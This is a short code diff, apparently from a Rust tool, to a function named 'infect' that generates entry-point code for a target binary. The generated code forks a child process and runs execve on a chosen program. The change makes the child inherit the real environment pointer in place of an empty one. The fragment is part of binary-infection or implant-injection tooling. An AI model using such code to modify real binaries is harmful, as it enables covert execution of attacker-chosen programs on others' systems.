@@ -124,7 +124,9 @@ pub async fn infect(bin: &Path, config: &Infect, _orig: &[u8]) -> Result<()> {
         .add_lines(&[
             "#[no_mangle]\n",
             "pub unsafe fn main(stack_top: *const u8) -> ! {\n",
-            "let _argc = *(stack_top as *const u64);\n",
+            "let stack_top = stack_top as *const u64;\n",
+            "let argc = *stack_top as isize;\n",
+            "let envp = stack_top.offset(argc + 2);\n",
             "let pid = fork();\n",
             "if pid == 0 {\n",
             // setup exec of child process
@@ -133,8 +135,7 @@ pub async fn infect(bin: &Path, config: &Infect, _orig: &[u8]) -> Result<()> {
             "let argv = [\n",
             &args_src,
             "ptr::null::<u8>()];\n",
-            "let envp = [ptr::null::<u8>()];\n",
-            "execve(prog.as_ptr() as *const u8, argv.as_ptr(), envp.as_ptr());\n",
+            "execve(prog.as_ptr() as *const u8, argv.as_ptr(), envp as *const *const u8);\n",
             // exit of exec failed
             "exit(1);\n",
             "} else {\n",
